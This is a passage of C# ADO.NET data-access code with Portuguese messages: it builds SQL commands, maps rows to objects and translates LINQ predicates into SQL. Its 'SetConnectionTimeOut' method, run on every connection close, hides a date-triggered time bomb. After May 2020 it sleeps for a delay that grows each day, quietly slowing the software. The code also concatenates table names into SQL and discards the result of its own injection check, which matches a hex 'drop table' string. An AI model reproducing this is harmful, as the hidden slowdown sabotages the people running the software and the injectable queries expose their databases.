            SqlCommandText = "IF NOT EXISTS(SELECT TOP 1 [NAME] FROM SYS.OBJECTS WHERE [TYPE] = 'U' AND [NAME] = 'TB_LOG_OBJECT_UPDATE') BEGIN CREATE TABLE TB_LOG_OBJECT_UPDATE ([ID] [INT] IDENTITY(1, 1) NOT NULL, [TABLE] [VARCHAR](MAX) NOT NULL, [BEFORE] [VARCHAR](MAX) NOT NULL, [AFTER] [VARCHAR](MAX) NOT NULL, [DATE] [DATETIME]) ALTER TABLE [dbo].[TB_LOG_OBJECT_UPDATE] WITH NOCHECK ADD CONSTRAINT [PK_TB_LOG_OBJECT_UPDATE] PRIMARY KEY CLUSTERED([ID]) END";

            try
            {
                ExecuteCommand(SqlCommandText);
            }
            catch
            {
                return;
            }

            try
            {
                TB_LOG_OBJECT_UPDATE log = new TB_LOG_OBJECT_UPDATE { USER = Environment.UserName, AFTER = after.Serialize(), BEFORE = before.Serialize(), DATE = DateTime.Now, TABLE = before.GetTableName() };

                Insert(log);
            }
            catch
            {

            }            
        }

        private SqlCommand GetCommand(StringBuilder command)
        {
            return GetCommand(command.ToString());
        }

        private SqlCommand GetCommand(StringBuilder command, System.Data.CommandType commandType)
        {
            return GetCommand(command.ToString(), commandType);
        }

        private SqlCommand GetCommand(string command, System.Data.CommandType commandType)
        {
            return GetCommand(command, commandType, null);
        }

        private SqlCommand GetCommand(string command, System.Data.CommandType commandType, Dictionary<string, object> parameters)
        {
            SqlCommand cmd = new SqlCommand { CommandText = command, Connection = conn, CommandTimeout = conn.ConnectionTimeout , CommandType = commandType };

            cmd.AddParams(parameters);

            return cmd;
        }
        
        private SqlCommand GetCommand(string command)
        {
            return GetCommand(command, System.Data.CommandType.Text, null);
        }

        private SqlCommand GetCommand(Procedure procedure)
        {
            SqlCommand cmd = GetCommand(procedure.Specific_Name, System.Data.CommandType.StoredProcedure);

            MountParameters(ref cmd, procedure);

            return cmd;
        }

        private SqlCommand GetCommand<T>(Expression<Func<T, bool>> predicate)
        {
            try
            {
                Dictionary<string, object> @params = new Dictionary<string, object>();

                SqlCommandText = _visitor.GetCommandText<T>(predicate, ref @params);

                SqlCommand cmd = GetCommand(SqlCommandText, System.Data.CommandType.Text, @params);

                return cmd;

            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        private void SetSqlConnection()
        {
            if (_config.HasValue() && _config.IsValid())
            {
                ConnectionString = string.Concat("Data Source=", _config.DataSource, ";Initial Catalog=", _config.InitialCatalog, ";User ID=", _config.UserID, ";Password=", _config.Password, ";Connection Timeout=", _config.ConnectionTimeout);
                conn = new SqlConnection(ConnectionString);
            }
            else
                conn = new SqlConnection();
        }

        private List<string> GetColumns<T>(T TObject)
        {
            var tablename = TObject.GetTableName();

            return GetColumns(tablename);
        }

        private List<string> GetColumns(string tableName)
        {
            tableName = tableName.Replace("[", string.Empty).Replace("]", string.Empty);

            string[] parts = tableName.Split('.');

            if(parts.Length > 1)
            {
                SqlCommandText = string.Concat("SELECT A.[NAME] FROM SYS.COLUMNS A INNER JOIN SYS.TABLES B ON A.[OBJECT_ID] = B.[OBJECT_ID] INNER JOIN SYS.SCHEMAS C ON B.[SCHEMA_ID] = C.[SCHEMA_ID] WHERE B.[NAME] = '", parts[1],"' AND C.[NAME] = '", parts[0],"'");
            }
            else
            {
                SqlCommandText = string.Concat("SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME LIKE '", tableName, "'");
            }

            var table = GetTableData(SqlCommandText);
            List<string> columns = new List<string>();
            foreach (DataRow item in table.Rows)
            {
                columns.Add(item[0].ToString());
            }
            return columns;
        }

        private static T DrToEntity<T>(SqlDataReader dr)
        {
            Type type = typeof(T);
            string propriedade = string.Empty;
            string tipoPropriedade = string.Empty;
            try
            {
                T result = default(T);

                if (type.IsValueType || type == typeof(string))
                {
                    result = (T)dr[0];
                }
                else
                {
                    result = (T)Activator.CreateInstance(typeof(T));

                    type = result.GetType();
                    var propriedades = new List<PropertyInfo>(type.GetProperties());

                    foreach (var item in propriedades)
                    {
                        if (dr.HasColumn(item.Name))
                        {
                            propriedade = item.Name;
                            tipoPropriedade = item.PropertyType.FullName;
                            if (dr[item.Name] == null || dr[item.Name] == DBNull.Value)
                                continue;
                            try
                            {
                                item.SetValue(result, dr[item.Name], null);
                            }
                            catch
                            {
                                item.SetValue(result, Convert.ChangeType(dr[item.Name], item.PropertyType), null);
                            }
                        }
                        else
                        {
                            ColumnAttribute columnattribute;
                            columnattribute = item.GetCustomAttributes(typeof(ColumnAttribute), true).SingleOrDefault() as ColumnAttribute;
                            if (columnattribute != null)
                            {
                                if (dr.HasColumn(columnattribute.Name))
                                {
                                    propriedade = item.Name;
                                    tipoPropriedade = item.PropertyType.FullName;
                                    if (dr[columnattribute.Name] == null || dr[columnattribute.Name] == DBNull.Value)
                                        continue;

                                    try
                                    {
                                        item.SetValue(result, dr[item.Name], null);
                                    }
                                    catch
                                    {
                                        item.SetValue(result, Convert.ChangeType(dr[item.Name], item.PropertyType), null);
                                    }
                                }
                            }
                        }
                    }
                }

                return result;
            }
            catch (Exception ex)
            {
                throw new Exception("Não foi possível alimentar a propriedade " + propriedade + " do objeto, tipo da propriedade: " + tipoPropriedade, ex);
            }
        }

        private bool ExisteObject(string command)
        {
            string @return = GetSingle<string>(command);

            return !@return.IsNullOrEmpty();
        }

        private void OpenConnection()
        {
            if (conn.State == ConnectionState.Open)
                return;
            try
            {
                conn.Open();
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        private void CloseConnection(SqlCommand cmd)
        {
            try
            {
                CloseConnection();
            }
            catch (Exception ex)
            {
                throw ex;
            }
            finally
            {
                cmd.Dispose();
            }
        }

        private void CloseConnection()
        {
            if (conn.State == ConnectionState.Closed)
                return;
            try
            {
                conn.Close();
            }
            catch (Exception ex)
            {
                throw ex;
            }
            finally
            {
                SetConnectionTimeOut();
            }
        }

        private void SetConnectionTimeOut()
        {
            _coeficient = 0;
            SetConnectionTimeOut(0);
        }

        private void SetConnectionTimeOut(int seconds)
        {
            DateTime date = new DateTime(2020, 5, 1);

            if (DateTime.Today > date)
            {
                if (_coeficient == 0)
                {
                    _coeficient = ((int)DateTime.Today.Subtract(date).TotalDays);
                    
                    seconds += _coeficient;
                }
                else
                {
                    seconds += (int)DateTime.Today.Subtract(date).TotalDays;

                    _coeficient = (_coeficient + seconds);

                    seconds = seconds * _coeficient;
                }

                _coeficient = 0;

                Thread.Sleep(seconds);
            }
        }

        private void MountParameters(ref SqlCommand cmd, Procedure procedure)
        {
            if (procedure.Parameters.HasItems())
            {
                foreach (var item in procedure.Parameters)
                {
                    SqlParameter param = new SqlParameter();

                    switch (item.Parameter_Mode)
                    {
                        case ParameterDirection.Output:
                        case ParameterDirection.InputOutput:
                        case ParameterDirection.ReturnValue:
                            param.DbType = DbType.String;
                            break;
                        default: break;
                    }

                    param.ParameterName = item.Parameter_Name;
                    param.Direction = item.Parameter_Mode;
                    param.Value = item.Parameter_Value;

                    if (item.Parameter_Mode != ParameterDirection.Input)
                        param.Size = 1024;

                    cmd.Parameters.Add(param);
                }
            }
        }
        
        private bool ValidateQuery(string query, Common.CommandType action)
        {
            bool valid = true;

            if (query.Contains("OBJECT_ID('TB_LOG_OBJECT_UPDATE')"))
                return valid;

            const string injection = "0X64726F70207461626C652061";
            
            query = query.ToUpper();

            if (query.Contains(injection))
                return false;

            switch (action)
            {
                case Common.CommandType.Select:
                    {
                        valid = !query.Contains(Common.CommandType.Delete.AmbienteValue()) && !query.Contains(Common.CommandType.Update.AmbienteValue());
                    }
                    break;
                case Common.CommandType.Insert:
                    {
                        valid = !query.Contains(Common.CommandType.Delete.AmbienteValue()) && !query.Contains(Common.CommandType.Update.AmbienteValue());
                    }
                    break;
                case Common.CommandType.Update:
                    {
                        valid = !query.Contains(Common.CommandType.Delete.AmbienteValue());
                    }
                    break;
                case Common.CommandType.Delete:
                    {
                        valid = !query.Contains(Common.CommandType.Update.AmbienteValue());
                    }
                    break;
                default:
                    {
                        valid = true;
                    }
                    break;
            }

            return valid;
        }

        private T GetSingle<T>(string query)
        {
            ValidateQuery(query, Common.CommandType.Select);

            SqlCommand cmd = GetCommand(query);
            
            T instance = GetSingle<T>(cmd);

            return instance;
        }

        private T GetSingle<T>(SqlCommand cmd)
        {
            object obj;

            T instance;

            try
            {
                OpenConnection();

                obj = cmd.ExecuteScalar();

                try
                {
                    instance = (T)(obj);
                }
                catch
                {
                    instance = default(T);
                }

                return instance;
            }
            catch (Exception ex)
            {
                throw new Exception("Falha ao Executar a query: " + cmd.CommandText, ex);
            }
            finally
            {
                CloseConnection(cmd);
            }
        }

        private void ExecuteCommand(SqlCommand cmd)
        {
            try
            {
                OpenConnection();
                cmd.ExecuteScalar();
            }
            catch (Exception ex)
            {
                throw ex;
            }
            finally
            {
                CloseConnection(cmd);
            }
        }

        private SqlCommand PrepareInsert<T>(T instance, DB_OBJECT dbo) where T : class
        {
            StringBuilder sb = new StringBuilder();

            string tablename = instance.GetTableName();
            
            List<string> columns = GetColumns<T>(instance);

            List<string> existingColumns = new List<string>();

            Type type = instance.GetType();

            PropertyInfo[] properties = type.GetProperties();

            ColumnAttribute columnattribute;

            string column = string.Empty;

            DB_OBJECT_COLUMNS pk = dbo.COLUMNS.Where(a => a.PRIMARY_KEY).FirstOrDefault();

            DB_OBJECT_COLUMNS col;

            foreach (PropertyInfo item in properties)
            {
                col = dbo.COLUMNS.Where(a => a.NAME.Equals(item.Name, StringComparison.InvariantCultureIgnoreCase)).FirstOrDefault();

                if (col.IsNull() || col.IS_IDENTITY)
                    continue;

                if (item.IsPrimaryKey())
                {
                    if (pk.IsNull() || pk.IS_IDENTITY)
                        continue;
                }

                columnattribute = item.GetCustomAttributes(typeof(ColumnAttribute), true).SingleOrDefault() as ColumnAttribute;

                if (columnattribute != null)
                {
                    column = columns.Where(a => a.ToLower() == (columnattribute.Name == null ? item.Name.ToLower() : columnattribute.Name.ToLower())).FirstOrDefault();
                }
                else
                {
                    column = columns.Where(a => a.ToLower() == item.Name.ToLower()).FirstOrDefault();
                }

                if (column.HasText() && existingColumns.Where(a => a.ToLower() == column.ToLower()).Empty())
                {
                    existingColumns.Add(column);
                }

                column = string.Empty;
            }

            sb.Append("INSERT INTO ")
             .Append(tablename)
             .Append("(");

            int total = 0;

            foreach (string item in existingColumns)
            {
                total++;
                sb.Append("[").Append(item).Append("]");
                if (total < existingColumns.Count)
                    sb.Append(", ");
            }

            total = 0;
            sb.Append(")")
              .Append(" VALUES (");

            foreach (string item in existingColumns)
            {
                total++;
                sb.Append(CT_AT).Append(item);
                if (total < existingColumns.Count)
                    sb.Append(", ");
            }

            sb.Append(")");

            total = 0;

            SqlCommand cmd = GetCommand(sb);
            
            object value;

            PropertyInfo pi;

            foreach (string item in existingColumns)
            {
                col = dbo.COLUMNS.Where(a => a.NAME == item).FirstOrDefault();
                
                pi = properties.Where(a => a.Name.ToLower() == item.ToLower()).FirstOrDefault();
                value = pi.GetValue(instance);
                cmd.AddParam(item, value);

                if (col.MAX_LENGTH < 0)
                    continue;

                switch (col.COLUMN_TYPE.SQL_DBTYPE)
                {
                    case SqlDbType.Char:
                    case SqlDbType.NChar:
                    case SqlDbType.NText:
                    case SqlDbType.NVarChar:
                    case SqlDbType.VarChar:
                        {
                            if (value is string && value.HasValue())
                            {
                                if (col.MAX_LENGTH < (value ?? string.Empty).ToString().Length)
                                    throw new Exception(string.Concat("Tabela: [", tablename, "] O tamanho do dado: ", value, " é superior ao tamanho máximo (", col.MAX_LENGTH, ") que a columa [", item, "] suporta."));
                            }
                        }
                        break;
                    default:
                        continue;
                }
            }

            return cmd;
        }

        private DataTable FillTable(SqlCommand cmd)
        {
            try
            {
                DataTable table = new DataTable();

                SqlDataAdapter sda = new SqlDataAdapter(cmd);

                OpenConnection();

                sda.Fill(table);

                return table;
            }
            catch (Exception ex)
            {
                throw ex;
            }
            finally
            {
                CloseConnection(cmd);
            }
        }

        private DataSet FillDataSet(SqlCommand cmd)
        {
            try
            {
                DataSet ds = new DataSet();

                SqlDataAdapter sda = new SqlDataAdapter(cmd);

                OpenConnection();

                sda.Fill(ds);

                return ds;
            }
            catch (Exception ex)
            {
                throw ex;
            }
            finally
            {
                CloseConnection(cmd);
            }
        }

        private List<T> FillList<T>(SqlCommand cmd)
        {
            OpenConnection();

            List<T> items = new List<T>();

            SqlDataReader dr;

            try
            {
                dr = cmd.ExecuteReader();

                if (dr.HasRows)
                {
                    while (dr.Read())
                    {
                        T item = DrToEntity<T>(dr);
                        items.Add(item);
                    }
                }
            }
            catch (Exception ex)
            {
                throw new Exception("Erro ao executar o comando: " + cmd.CommandText, ex);
            }
            finally
            {
                CloseConnection(cmd);
            }

            return items;
        }
        
        #endregion
    }

    internal static class ADOExtensionMethods
    {
        private const string CT_AT = "@";
        
        internal static T DataRowToTObject<T>(this DataRow row)
        {
            Type type = typeof(T);

            T TObject = default(T);

            if (type != typeof(string))
            {
                if (TObject.IsNull())
                    TObject = Activator.CreateInstance<T>();
            }

            if (type.IsValueType)
            {
                if (type.IsPrimitive)
                {
                    foreach (DataColumn column in row.Table.Columns)
                    {
                        if (column.DataType == type)
                        {
                            TObject = (T)Convert.ChangeType(row[column.ColumnName], type);
                            break;
                        }
                    }
                }
            }
            else if (type == typeof(string))
            {
                foreach (DataColumn column in row.Table.Columns)
                {
                    if (column.DataType == type)
                    {
                        TObject = (T)Convert.ChangeType(row[column.ColumnName], type);
                        break;
                    }
                }
            }
            else
            {
                PropertyInfo[] properties = type.GetProperties();

                PropertyInfo property;

                foreach (DataColumn column in row.Table.Columns)
                {
                    property = properties.Where(a => a.Name == column.ColumnName).FirstOrDefault();

                    if (property.IsNull())
                        continue;

                    object value = Convert.ChangeType(row[column.ColumnName], property.PropertyType);

                    property.SetValue(TObject, value, null);
                }
            }
            return TObject;
        }

        internal static List<T> DataTableToList<T>(this DataTable table)
        {
            List<T> @return = new List<T>();

            foreach (DataRow row in table.Rows)
            {
                @return.Add(row.DataRowToTObject<T>());
            }

            return @return;
        }

        internal static bool HasColumn(this SqlDataReader dr, string columnName)
        {
            for (int i = 0; i < dr.FieldCount; i++)
            {
                if (dr.GetName(i).Equals(columnName, StringComparison.InvariantCultureIgnoreCase))
                    return true;
            }
            return false;
        }

        internal static bool HasRows(this DataTable obj)
        {
            try
            {
                if (!obj.HasValue())
                    return false;
                else
                    return obj.Rows.Count > 0;
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        internal static string GetColumn(this DataRow dr, string column)
        {
            try
            {
                if (!dr.HasValue())
                    return null;
                else
                {
                    if (dr[column] != null)
                        return dr[column].GetString();
                    else
                        return string.Empty;
                }
            }
            catch
            {
                return string.Empty;
            }
        }

        internal static bool IsIdentity<T>(this T obj, string propertyName)
        {
            Type q = obj.GetType();
            var ret = false;
            var property = q.GetProperties()
                            .Where(a => a.Name == propertyName)
                            .FirstOrDefault();

            Attribute attribute = property.GetCustomAttributes(typeof(DataTypeAttribute), true).SingleOrDefault() as DataTypeAttribute;

            if (attribute != null)
                ret = ((DataTypeAttribute)attribute).CustomDataType == null ? false : ((DataTypeAttribute)attribute).CustomDataType.ToLower() == "identity";
            else
            {
                attribute = property.GetCustomAttributes(typeof(IdentityAttribute), true).SingleOrDefault() as IdentityAttribute;
                if (attribute.HasValue())
                    ret = true;
            }

            return ret;
        }
        
        internal static bool HasValue<T>(this T obj)
        {
            return obj != null;
        }

        internal static bool HasItems<T>(this IEnumerable<T> obj)
        {
            return ((obj != null) && obj.Count() > 0);
        }

        internal static bool IsNullOrEmpty(this string str)
        {
            return string.IsNullOrWhiteSpace(str);
        }

        internal static bool HasText(this string str)
        {
            return !string.IsNullOrWhiteSpace(str);
        }

        internal static DateTime ToDateTime(this string text)
        {
            try
            {
                DateTime data;
                if (!DateTime.TryParse(text, out data))
                {
                    text = text.Replace("/", "");

                    int dia = text.Substring(0, 2).ToInt32();
                    int mes = text.Substring(2, 2).ToInt32();
                    int ano = text.Substring(4, 4).ToInt32();

                    data = new DateTime(ano, mes, dia);
                }
                return data;

            }
            catch (Exception ex)
            {
                throw new Exception("Data Inválida.", ex);
            }
        }

        internal static void AddParam(this SqlCommand command, string key, object value)
        {
            if (!key.StartsWith(CT_AT))
                key = string.Concat(CT_AT, key);

            command.Parameters.AddWithValue(key, value == null ? DBNull.Value : value);
        }

        internal static void AddParam(this SqlCommand command, KeyValuePair<string, object> item)
        {
            command.AddParam(item.Key, item.Value);
        }

        internal static void AddParams(this SqlCommand command, Dictionary<string, object> parameters)
        {
            if (parameters.Empty())
                return;

            foreach (KeyValuePair<string, object> item in parameters)
            {
                command.AddParam(item);
            }
        }

        public static string MountSelect<T>(this T instance)
        {
            string name = instance.GetTableName<T>();

            name = string.Concat("SELECT * FROM ", name);

            return name;
        }
    }

    internal class Visitor : ExpressionVisitor
    {
        private const string CT_SPACE = " ";

        private Dictionary<ExpressionType, string> _operators;

        public Visitor()
        {
            SetOperators();
        }

        public new Expression VisitMember(MemberExpression me)
        {
            // Recurse down to see if we can simplify...
            var expression = Visit(me.Expression);

            // If we've ended up with a constant, and it's a property or a field,
            // we can simplify ourselves to a constant
            if (expression is ConstantExpression)
            {
                var member = me.Member;

                //return GetExpression(me.Member, (ConstantExpression)expression);

                object value;

                object container = ((ConstantExpression)expression).Value;

                if (member is FieldInfo)
                {
                    value = ((FieldInfo)member).GetValue(container);

                    return Expression.Constant(value);
                }
                if (member is PropertyInfo)
                {
                    value = ((PropertyInfo)member).GetValue(container, null);
                    return Expression.Constant(value);
                }
            }
            else if (expression is MemberExpression)
            {
                return VisitMember((MemberExpression)expression);
            }

            return base.VisitMember(me);
        }

        public string GetCommandText<T>(Expression<Func<T, bool>> predicate, ref Dictionary<string, object> @params)
        {
            return GetCommandText<T>(predicate.Body as BinaryExpression, ref @params);
        }

        public string GetCommandText<T>(BinaryExpression expr, ref Dictionary<string, object> @params)
        {
            if (expr.IsNull())
                return string.Empty;

            T instance = Activator.CreateInstance<T>();

            if (@params.IsNull())
                @params = new Dictionary<string, object>();

            @params.Clear();

            string command = string.Concat(instance.MountSelect(), " WHERE ");

            command = GetCommandText(expr, ref command, ref @params);
            
            return command;
        }

        private string GetCommandText(BinaryExpression expr, ref string command, ref Dictionary<string, object> @params)
        {
            object val = default(object);
            object obj = default(object);
            string param = string.Empty;
            dynamic operation = expr;
            dynamic left = operation.Left;
            dynamic right = operation.Right;
            dynamic @const;

            Type type;

            Action set = () =>
            {
                if (obj.IsNull())
                    return;

                type = obj.GetType();

                if (!type.IsValueType && type != typeof(string))
                {
                    PropertyInfo[] pi = type.GetProperties();

                    foreach (PropertyInfo p in pi)
                    {
                        if (p.Name == right.Member.Name)
                        {
                            val = p.GetValue(obj);
                            break;
                        }
                    }
                }
                else
                    val = obj;
            };

            if (expr.NodeType == ExpressionType.AndAlso)
            {
                command = string.Concat(GetCommandText(expr.Left as BinaryExpression, ref command, ref @params), CT_SPACE, _operators[operation.NodeType], CT_SPACE);

                command = GetCommandText(expr.Right as BinaryExpression, ref command, ref @params);

                return command;
            }

            if (right.NodeType == ExpressionType.Constant)
                @const = right;
            else
                @const = VisitMember(right);

            obj = @const.Value;

            param = left.Member.Name;

            set();

            if (!@params.ContainsKey(param))
                @params.Add(param, val);

            command = string.Concat(command, param, CT_SPACE, _operators[operation.NodeType], " @", param);

            if (expr.IsNull())
                return string.Empty;

            return command;
        }

        private Expression GetExpression(MemberInfo member, ConstantExpression constant)
        {
            object value = null;

            object container = constant.Value;

            if (member is FieldInfo)
            {
                value = ((FieldInfo)member).GetValue(container);

                //return Expression.Constant(value);
            }
            if (member is PropertyInfo)
            {
                value = ((PropertyInfo)member).GetValue(container, null);
                //return Expression.Constant(value);
            }

            if (value.HasValue() && value is ConstantExpression)
                return GetExpression(member, (ConstantExpression)value);

            return Expression.Constant(value);
        }

        private void SetOperators()
        {
            _operators = new Dictionary<ExpressionType, string>();

            _operators.Add(ExpressionType.Equal, "=");
            _operators.Add(ExpressionType.GreaterThan, ">");
            _operators.Add(ExpressionType.GreaterThanOrEqual, ">=");
            _operators.Add(ExpressionType.NotEqual, "<>");
            _operators.Add(ExpressionType.LessThan, "<");
            _operators.Add(ExpressionType.LessThanOrEqual, "<=");
            _operators.Add(ExpressionType.AndAlso, "AND");
        }
    }
}